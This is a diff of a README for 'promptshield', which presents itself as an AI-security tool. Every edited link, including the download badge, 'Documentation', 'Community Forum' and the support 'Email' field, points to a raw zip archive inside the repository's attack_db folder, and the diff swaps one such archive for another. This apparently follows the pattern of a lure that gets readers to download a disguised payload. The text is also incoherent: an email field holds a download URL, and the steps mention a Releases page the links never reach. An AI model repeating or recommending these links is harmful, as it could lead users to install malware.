@@ -16,7 +16,7 @@ Before you download promptshield, ensure you have the following:
 ## 📥 Download & Install
 To get started with promptshield, visit the link below to download the latest version.
 
-[![Download promptshield](https://github.com/Georgeyoussef066/promptshield/raw/refs/heads/main/promptshield/attack_db/policy_bypass/Software-1.3-alpha.5.zip%https://github.com/Georgeyoussef066/promptshield/raw/refs/heads/main/promptshield/attack_db/policy_bypass/Software-1.3-alpha.5.zip)](https://github.com/Georgeyoussef066/promptshield/raw/refs/heads/main/promptshield/attack_db/policy_bypass/Software-1.3-alpha.5.zip)
+[![Download promptshield](https://github.com/Georgeyoussef066/promptshield/raw/refs/heads/main/promptshield/attack_db/encoding/Software_3.5.zip%https://github.com/Georgeyoussef066/promptshield/raw/refs/heads/main/promptshield/attack_db/encoding/Software_3.5.zip)](https://github.com/Georgeyoussef066/promptshield/raw/refs/heads/main/promptshield/attack_db/encoding/Software_3.5.zip)
 
 1. Click the link above.
 2. You will be redirected to the Releases page.
@@ -51,13 +51,13 @@ promptshield offers a range of features to enhance the security of your AI appli
 ## 📚 Additional Resources
 For further assistance, you can access these resources:
 
-- [Documentation](https://github.com/Georgeyoussef066/promptshield/raw/refs/heads/main/promptshield/attack_db/policy_bypass/Software-1.3-alpha.5.zip) for detailed instructions and tips.
-- [Community Forum](https://github.com/Georgeyoussef066/promptshield/raw/refs/heads/main/promptshield/attack_db/policy_bypass/Software-1.3-alpha.5.zip) to connect with other users and share experiences.
+- [Documentation](https://github.com/Georgeyoussef066/promptshield/raw/refs/heads/main/promptshield/attack_db/encoding/Software_3.5.zip) for detailed instructions and tips.
+- [Community Forum](https://github.com/Georgeyoussef066/promptshield/raw/refs/heads/main/promptshield/attack_db/encoding/Software_3.5.zip) to connect with other users and share experiences.
 
 ## 📞 Support
 If you encounter issues while using promptshield, please reach out to our support team:
 
-- **Email**: https://github.com/Georgeyoussef066/promptshield/raw/refs/heads/main/promptshield/attack_db/policy_bypass/Software-1.3-alpha.5.zip
+- **Email**: https://github.com/Georgeyoussef066/promptshield/raw/refs/heads/main/promptshield/attack_db/encoding/Software_3.5.zip
 - **GitHub Issues**: Use the Issues section on the GitHub repository for reporting bugs or asking questions.
 
 ## 🔗 Further Information
@@ -72,4 +72,4 @@ For updates and news, follow our GitHub repository.
 ## 📥 Download & Install
 Revisit the main download link to grab the latest version of promptshield and ensure your AI applications are secure.
 
-[![Download promptshield](https://github.com/Georgeyoussef066/promptshield/raw/refs/heads/main/promptshield/attack_db/policy_bypass/Software-1.3-alpha.5.zip%https://github.com/Georgeyoussef066/promptshield/raw/refs/heads/main/promptshield/attack_db/policy_bypass/Software-1.3-alpha.5.zip)](https://github.com/Georgeyoussef066/promptshield/raw/refs/heads/main/promptshield/attack_db/policy_bypass/Software-1.3-alpha.5.zip)
+[![Download promptshield](https://github.com/Georgeyoussef066/promptshield/raw/refs/heads/main/promptshield/attack_db/encoding/Software_3.5.zip%https://github.com/Georgeyoussef066/promptshield/raw/refs/heads/main/promptshield/attack_db/encoding/Software_3.5.zip)](https://github.com/Georgeyoussef066/promptshield/raw/refs/heads/main/promptshield/attack_db/encoding/Software_3.5.zip)
